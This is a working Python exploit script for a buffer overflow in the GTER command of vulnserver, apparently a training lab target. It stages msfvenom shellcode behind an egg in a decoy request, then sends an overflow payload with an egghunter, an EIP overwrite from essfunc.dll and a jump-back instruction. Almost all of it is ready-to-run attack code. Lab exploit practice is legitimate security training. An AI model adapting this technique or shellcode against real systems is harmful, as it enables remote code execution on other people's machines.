#!/usr/bin/python3

# Buffer overflow in GTER command of vulnserver
# small shellcode space requires jump + egghunter

import subprocess
import socket
import struct

target_ip = "X.X.X.X"
target_port = 9999

def main():
    # msfvenom -p windows/exec CMD="calc" -f python -b "\x00"
    buf =  b""
    buf += b"\xda\xd7\xd9\x74\x24\xf4\xbb\xe6\x3e\xa9\x47\x5a\x33"
    buf += b"\xc9\xb1\x30\x83\xea\xfc\x31\x5a\x14\x03\x5a\xf2\xdc"
    buf += b"\x5c\xbb\x12\xa2\x9f\x44\xe2\xc3\x16\xa1\xd3\xc3\x4d"
    buf += b"\xa1\x43\xf4\x06\xe7\x6f\x7f\x4a\x1c\xe4\x0d\x43\x13"
    buf += b"\x4d\xbb\xb5\x1a\x4e\x90\x86\x3d\xcc\xeb\xda\x9d\xed"
    buf += b"\x23\x2f\xdf\x2a\x59\xc2\x8d\xe3\x15\x71\x22\x80\x60"
    buf += b"\x4a\xc9\xda\x65\xca\x2e\xaa\x84\xfb\xe0\xa1\xde\xdb"
    buf += b"\x03\x66\x6b\x52\x1c\x6b\x56\x2c\x97\x5f\x2c\xaf\x71"
    buf += b"\xae\xcd\x1c\xbc\x1f\x3c\x5c\xf8\xa7\xdf\x2b\xf0\xd4"
    buf += b"\x62\x2c\xc7\xa7\xb8\xb9\xdc\x0f\x4a\x19\x39\xae\x9f"
    buf += b"\xfc\xca\xbc\x54\x8a\x95\xa0\x6b\x5f\xae\xdc\xe0\x5e"
    buf += b"\x61\x55\xb2\x44\xa5\x3e\x60\xe4\xfc\x9a\xc7\x19\x1e"
    buf += b"\x45\xb7\xbf\x54\x6b\xac\xcd\x36\xe1\x33\x43\x4d\x47"
    buf += b"\x33\x5b\x4e\xf7\x5c\x6a\xc5\x98\x1b\x73\x0c\xdd\xd4"
    buf += b"\x39\x0d\x77\x7d\xe4\xc7\xca\xe0\x17\x32\x08\x1d\x94"
    buf += b"\xb7\xf0\xda\x84\xbd\xf5\xa7\x02\x2d\x87\xb8\xe6\x51"
    buf += b"\x34\xb8\x22\x32\xdb\x2a\xae\xb5"
    # send a fake command with shellcode behind it, sending a real command risks truncating shellcode
    # syntax is "COMMAND egg shellcode"
    buf_string = b"RANDO_STRING w00tw00t" + buf
    prepend = b"GTER /.:/"
    # discovered offset using boofuzz
    offset = 147
    # !mona egg
    egghunter = b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
    # eip found at 0x62501203 in essfunc.dll
    eip = struct.pack("<I", 0x62501203)
    # Placed at ESP, jumps back 41 bytes to execute the egghunter
    jumpback = b"\xeb\xd7\x90\x90"

    # Attack wouldn't work unless I placed at least 4 bytes between egghunter and EIP, i don't know why
    attack_string = prepend + (b"\x90"*(offset - len(egghunter) - 4)) + egghunter + (b"\x90"*4) + eip + jumpback
    
    # send fake request
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_ip, target_port))
    response = s.recv(2048)
    print(response.decode())
    s.send(buf_string)
    response = s.recv(2048)
    print(response.decode())
    s.close()
    
    # send attack
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_ip, target_port))
    response= s.recv(2048)
    print(response.decode())
    s.send(attack_string)
    s.close()

if __name__ == "__main__":
    main()
